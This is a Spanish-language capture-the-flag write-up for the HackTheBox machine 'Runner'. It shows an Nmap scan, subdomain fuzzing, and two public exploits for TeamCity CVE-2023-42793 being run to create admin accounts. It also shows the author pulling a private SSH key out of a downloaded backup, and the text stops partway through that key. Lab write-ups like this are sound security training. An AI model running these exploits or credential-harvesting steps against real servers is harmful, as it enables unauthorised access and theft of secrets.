<!doctype html><html lang=es><head><title>HTB Runner WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Runner' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Runner WriteUp"><meta name=twitter:description content="HackThebox 'Runner' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/runner/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Runner WriteUp"><meta property="og:description" content="HackThebox 'Runner' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-24T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-24T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Medium"><meta property="article:tag" content="Portainer"><meta property="article:tag" content="Local Port Forwarding"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/runner/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/runner/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/runner/>HTB Runner WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-24T00:00:00Z>24 agosto, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
13 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/portainer/>Portainer</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/local-port-forwarding/>Local Port Forwarding</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/teamcity/>Teamcity</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/searchsploit/>Searchsploit</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ffuf/>Ffuf</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/vhost/>Vhost</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/docker/>Docker</a></span></div></div></header><div class=post-content><h1 id=runner----hackthebox>Runner &ndash; HackTheBox
<a class=heading-link href=#runner----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty / Dificultad: <em>Medium</em> / <em>Media</em></li><li>Platform / Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Runner&rsquo; Avatar" src=/pentesting/images/Runner_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Runner</code> es una m√°quina de dificultad media de la plataforma <code>HackTheBox</code>. Luego de buscar por <code>vhosts</code> en esta m√°quina, encontramos un sitio web el cual est√° corriendo una versi√≥n vulnerable de <code>TeamCity</code>, con una vulnerabilidad catalogada como <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-42793 class=external-link target=_blank rel=noopener>CVE-2023-42793</a>, la cual nos permite crear/obtener credenciales para acceder al panel de este servicio. Ya dentro de este servicio, somos capaces de encontrar algunos archivos de respaldo los cuales contienen keys <code>SSH</code> para un usuario, ganando as√≠ acceso inicial a la m√°quina v√≠ctima. Una vez dentro, podemos ver que la m√°quina est√° corriendo internamente <code>Portainer</code> &ndash;una herramienta para administrar contenedores como, por ejemplo, <code>Docker</code>&ndash;, en el cual somos capaces de loguearnos gracias a una contrase√±a la cual tambi√©n fue encontrada en los archivos de respaldo. Una vez dentro de este nuevo servicio interno, somos capaces de realizar una montura del sistema original en un contedor abusando de la vulnerabilidad <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-21626 class=external-link target=_blank rel=noopener>CVE-2024-21626</a>, lo cual nos permite tener acceso a archivos privilegiados dentro del sistema.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Empezando con un scan con <code>Nmap</code> muestra 3 puertos abiertos: <code>22</code> <code>SSH</code>, <code>80</code> <code>HTTP</code> y <code>8080</code> aparentemente corriendo el servicio <code>Nagios XI</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80,8000 10.10.11.13 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 21:36 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.13
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.19s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE     VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp   open  http        nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://runner.htb/
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>8000/tcp open  nagios-nsca Nagios NSCA
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
</span></span></span></code></pre></div><p>Del scan puedo ver que la conexi√≥n al puerto <code>80</code> redirige a <code>http://runner.htb</code>, de manera que agrego este dominio a mi archivo <code>/etc/hosts</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.13 runner.htb&#39; | sudo tee -a /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.13 runner.htb
</span></span></span></code></pre></div><p>Una vez agregado el dominio, visitando <code>http://runner.htb</code> muestra un simple sitio web haciendo referencia a optimizaci√≥n de c√≥digo:</p><p><img alt="Runner 1" src=/pentesting/images/Runner_1.png></p><p>Muchos de los botones de esta web no funcionan y s√≥lo somos capaces de enviar un e-mail a <code>sales@runner.htb</code>. Dado que no hay nada interesante aqu√≠, empezamos a buscar subdominios que podr√≠an estar aplicando <code>vhosting</code> con la herramienta <code>ffuf</code>. Ahora, la parte &ldquo;tramposa&rdquo; de esta m√°quina es que usualmente utilizamos el diccionario <code>subdomains-top1million-XXXX.txt</code> de <code>SecLists</code>, pero esta vez deberemos de utilizar otro distinto como <code>/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code>. Realizando esto tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://runner.htb/ -H &#39;Host: FUZZ.runner.htb&#39;  -fs 154 -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://runner.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.runner.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 55
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response size: 154
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 827ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [100000/100000] :: Job [1/1] :: 341 req/sec :: Duration: [0:04:36] :: Errors: 0 ::
</span></span></span></code></pre></div><p>de donde tenemos un nuevo subdominio: <code>teamcity.runner.htb</code></p><p>Agregamos este nuevo subdominio a nuestro archivo<code>/etc/hosts</code>, de manera que ahora √©sta se va como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ tail -n 1 /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.13 runner.htb teamcity.runner.htb
</span></span></span></code></pre></div><p>Visitando <code>http://teamcity.runner.htb</code> redirige a su directorio <code>/login.html</code>. El nuevo sitio encontrado es un panel de login:</p><p><img alt="Runner 2" src=/pentesting/images/Runner_2.png></p><p>Este sitio est√°, aparentemente, usando <code>TeamCity</code>.</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><code>TeamCity</code> is used to build and test software products in an automated manner. It provides rapid feedback on every code change, reduces code integration problems, and leads to more effective teamwork. Many popular games, websites, banking systems, and all <code>JetBrains</code> products are built with <code>TeamCity</code></div></div><p>En resumen, <code>TeamCity</code> es una herramienta que ayuda al desarrollo de software en los procesos de gesti√≥n que √©ste tiene (desarrollo, testing y deployment).</p><hr><h3 id=alternativa-1-exploit-de-repositorio-de-github-para-extraer-credenciales>Alternativa 1: Exploit de repositorio de Github para extraer credenciales
<a class=heading-link href=#alternativa-1-exploit-de-repositorio-de-github-para-extraer-credenciales><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>Buscando por <code>TeamCity exploit</code> en Google nos lleva a <a href=https://github.com/H454NSec/CVE-2023-42793 class=external-link target=_blank rel=noopener>este repositorio de Github</a> el cual se basa en la vulnerabilidad <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-42793 class=external-link target=_blank rel=noopener>CVE-2023-42793</a>. B√°sicamente, este exploit nos permite crear un nuevo usuario con privilegios de administrador. Esto es debido a que el endpoint <code>/app/rest/users/id:1/tokens/RPC2</code> se encuentra expuesto sin requerir autenticaci√≥n; de aqu√≠ uno podr√≠a obtener un token de autenticaci√≥n (para un admin, por ejemplo). Basados en la p√°gina describiendo la vulnerabilidad, las versiones vulnerables son hasta <code>2023.05.4</code> (excluyente). De la p√°gina de login podemos ver que la versi√≥n es <code>2023.05.3</code>, de manera que deber√≠a de ser vulnerable. Clonamos el repositorio nombrado al inicio y lo corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/H454NSec/CVE-2023-42793.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;CVE-2023-42793&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 28, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (28/28), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (27/27), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 28 (delta 12), reused 0 (delta 0), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (28/28), 10.79 KiB | 216.00 KiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (12/12), done.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ python3 CVE-2023-42793.py -u http://teamcity.runner.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] http://teamcity.runner.htb/login.html [H454NSec6009:@H454NSec]
</span></span></span></code></pre></div><p>de donde obtenemos credenciales: <code>H454NSec6009:@H454NSec</code></p><hr><h3 id=alternativa-2-crear-un-nuevo-usuario-admin-usando-exploit-de-searchsploit>Alternativa 2: Crear un nuevo usuario admin usando exploit de <code>SearchSploit</code>
<a class=heading-link href=#alternativa-2-crear-un-nuevo-usuario-admin-usando-exploit-de-searchsploit><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>Usando <code>SearchSploit</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ searchsploit teamcity
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go> Exploit Title                                     |  Path
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>JetBrains TeamCity 2018.2.4 - Remote Code Executio | java/remote/47891.txt
</span></span></span><span class=line><span class=cl><span class=go>JetBrains TeamCity 2023.05.3 - Remote Code Executi | java/remote/51884.py
</span></span></span><span class=line><span class=cl><span class=go>TeamCity &lt; 9.0.2 - Disabled Registration Bypass    | multiple/remote/46514.js
</span></span></span><span class=line><span class=cl><span class=go>TeamCity Agent - XML-RPC Command Execution (Metasp | multiple/remote/45917.rb
</span></span></span><span class=line><span class=cl><span class=go>TeamCity Agent XML-RPC 10.0 - Remote Code Executio | php/webapps/48201.py
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Shellcodes: No Results
</span></span></span></code></pre></div><p>Donde el exploit <code>51884</code> se ve prometedor.</p><p>Copio este script y lo corro. Aparentemente, la primera vez que corremos este script simplemente recolecta informaci√≥n de la m√°quina v√≠ctima:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ searchsploit -m 51884
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Copied to: /home/gunzf0x/HTB/HTBMachines/Medium/Runner/exploits/51884.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ mv 51884.py teamcity_exploit.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ python3 teamcity_exploit.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>usage: teamcity_exploit.py [-h] -u URL [-v]
</span></span></span><span class=line><span class=cl><span class=go>teamcity_exploit.py: error: the following arguments are required: -u/--url
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ python3 teamcity_exploit.py -u http://teamcity.runner.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Token already exists
</span></span></span><span class=line><span class=cl><span class=go>Previous token deleted successfully
</span></span></span><span class=line><span class=cl><span class=go>run this command again for creating new token &amp; admin user.
</span></span></span></code></pre></div><p>Y si lo volvemos a correr ahora tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 teamcity_exploit.py -u http://teamcity.runner.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Token: eyJ0eXAiOiAiVENWMiJ9.YktIb0JhZ09yVVcxd011MUJNNXlXMWtzNkk0.ZTlkODdkZTgtNWI5YS00OWE0LWEzMTgtYzNjZjU3MDRhMzBk
</span></span></span><span class=line><span class=cl><span class=go>Successfully exploited!
</span></span></span><span class=line><span class=cl><span class=go>URL: http://teamcity.runner.htb
</span></span></span><span class=line><span class=cl><span class=go>Username: city_adminE7xn
</span></span></span><span class=line><span class=cl><span class=go>Password: Main_password!!**
</span></span></span></code></pre></div><hr><p>De vuelta al panel de login nos podemos loguear con las credenciales <code>H454NSec6009:@H454NSec</code> o podemos usar el usuario creado con el exploit de <code>SearchSploit</code>. Logeandonos con las credenciales dentro de <code>TeamCity</code> podemos ver un panel:</p><p><img alt="Runner 3" src=/pentesting/images/Runner_3.png></p><p>Si clickeamos en <code>Administration</code> en la parte superior izquierda tendremos lo siguiente:</p><p><img alt="Runner 4" src=/pentesting/images/Runner_4.png></p><p>Luego, al lado izquierdo, scrolleando hasta abajo hasta la secci√≥n de <code>Server Administration</code> soy capaz de ver una opci√≥n de <code>Backup</code>. Clickeando en esta opci√≥n podemos ver ahora:</p><p><img alt="Runner 5" src=/pentesting/images/Runner_5.png></p><p>Clickeando en <code>Start Backup</code> crea un archivo <code>.zip</code> la cual puede ser descargada.
Descargando y descomprimiendo el archivo <code>.zip</code> crea m√∫ltiples archivos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ unzip TeamCity_Backup_20240529_025322.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Archive:  TeamCity_Backup_20240529_025322.zip
</span></span></span><span class=line><span class=cl><span class=go>TeamCity data backup; ZIP factory in use: memory-conservative (dynamic, shared); compression level -1.
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 296
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 6 gunzf0x gunzf0x   4096 May 28 22:57 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x   4096 May 28 22:57 ..
</span></span></span><span class=line><span class=cl><span class=go>---------- 1 gunzf0x gunzf0x      6 May 29  2024 charset
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 7 gunzf0x gunzf0x   4096 May 28 22:57 config
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x   4096 May 28 22:57 database_dump
</span></span></span><span class=line><span class=cl><span class=go>---------- 1 gunzf0x gunzf0x    630 May 29  2024 export.report
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x   4096 May 28 22:57 metadata
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x   4096 May 28 22:57 system
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 264776 May 28 22:56 TeamCity_Backup_20240529_025322.zip
</span></span></span><span class=line><span class=cl><span class=go>---------- 1 gunzf0x gunzf0x     92 May 29  2024 version.txt
</span></span></span></code></pre></div><p>Usando el comando <code>find</code> decido buscar por nombres de archivos que puedan ser interesantes, como alguna key que pudiese tener el nombre <code>id_rsa</code>. Y hallamos algo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ find . -name &#34;*id_rsa*&#34; 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
</span></span></span></code></pre></div><p>Y leyendo √©sta tenemos una key de <code>SSH</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ chmod 600 ./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cat ./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span></span><span class=line><span class=cl><span class=go>NhAAAAAwEAAQAAAYEAlk2rRhm7T2dg2z3+Y6ioSOVszvNlA4wRS4ty8qrGMSCpnZyEISPl
</span></span></span><span class=line><span class=cl><span class=go>htHGpTu0oGI11FTun7HzQj7Ore7YMC+SsMIlS78MGU2ogb0Tp2bOY5RN1/X9MiK/SE4liT
</span></span></span><span class=line><span class=cl><span class=go>njhPU1FqBIexmXKlgS/jv57WUtc5CsgTUGYkpaX6cT2geiNqHLnB5QD+ZKJWBflF6P9rTt
</span></span></span><span class=line><span class=cl><span class=go>zkEdcWYKtDp0Phcu1FUVeQJOpb13w/L0GGiya2RkZgrIwXR6l3YCX+mBRFfhRFHLmd/lgy
</span></span></span><span class=line><span class=cl><span class=go>/R2GQpBWUDB9rUS+mtHpm4c3786g11IPZo+74I7BhOn1Iz2E5KO0tW2jefylY2MrYgOjjq
</span></span></span><span class=line><span class=cl><span class=go>5fj0Fz3eoj4hxtZyuf0GR8Cq1AkowJyDP02XzIvVZKCMDgVNAMH5B7COTX8CjUzc0vuKV5
</span></span></span><span class=line><span class=cl><span class=go>iLSi+vRx6vYQpQv4wlh1H4hUlgaVSimoAqizJPUqyAi9oUhHXGY71x5gCUXeULZJMcDYKB
</span></span></span><span class=line><span class=cl><span class=go>Z2zzex3+iPBYi9tTsnCISXIvTDb32fmm1qRmIRyXAAAFgGL91WVi/dVlAAAAB3NzaC1yc2
</span></span></span><span class=line><span class=cl><span class=go>EAAAGBAJZNq0YZu09nYNs9/mOoqEjlbM7zZQOMEUuLcvKqxjEgqZ2chCEj5YbRxqU7tKBi
</span></span></span><span class=line><span class=cl><span class=go>NdRU7p+x80I+zq3u2DAvkrDCJUu/DBlNqIG9E6dmzmOUTdf1/TIiv0hOJYk544T1NRagSH
</span></span></span><span class=line><span class=cl><span class=go>sZlypYEv47+e1lLXOQrIE1BmJKWl+nE9oHojahy5weUA/mSiVgX5Rej/a07c5BHXFmCrQ6
</span></span></span><span class=line><span class=cl><span class=go>dD4XLtRVFXkCTqW9d8Py9BhosmtkZGYKyMF0epd2Al/pgURX4URRy5nf5YMv0dhkKQVlAw
</span></span></span><span class=line><span class=cl><span class=go>fa1EvprR6ZuHN+/OoNdSD2aPu+COwYTp9SM9hOSjtLVto3n8pWNjK2IDo46uX49Bc93qI+
</span></span></span><span class=line><span class=cl><span class=go>IcbWcrn9BkfAqtQJKMCcgz9Nl8yL1WSgjA4FTQDB+Qewjk1/Ao1M3NL7ileYi0ovr0cer2
</span></span></span><span class=line><span class=cl><span class=go>EKUL+MJYdR+IVJYGlUopqAKosyT1KsgIvaFIR1xmO9ceYAlF3lC2STHA2CgWds83sd/ojw
</span></span></span><span class=line><span class=cl><span class=go>WIvbU7JwiElyL0w299n5ptakZiEclwAAAAMBAAEAAAGABgAu1NslI8vsTYSBmgf7RAHI4N
</span></span></span><span class=line><span class=cl><span class=go>BN2aDndd0o5zBTPlXf/7dmfQ46VTId3K3wDbEuFf6YEk8f96abSM1u2ymjESSHKamEeaQk
</span></span></span><span class=line><span class=cl><span class=go>lJ1wYfAUUFx06SjchXpmqaPZEsv5Xe8OQgt/KU8BvoKKq5TIayZtdJ4zjOsJiLYQOp5oh/
</span></span></span><span class=line><span class=cl><span class=go>1jCAxYnTCGoMPgdPKOjlViKQbbMa9e1g6tYbmtt2bkizykYVLqweo5FF0oSqsvaGM3MO3A
</span></span></span><span class=line><span class=cl><span class=go>Sxzz4gUnnh2r+AcMKtabGye35Ax8Jyrtr6QAo/4HL5rsmN75bLVMN/UlcCFhCFYYRhlSay
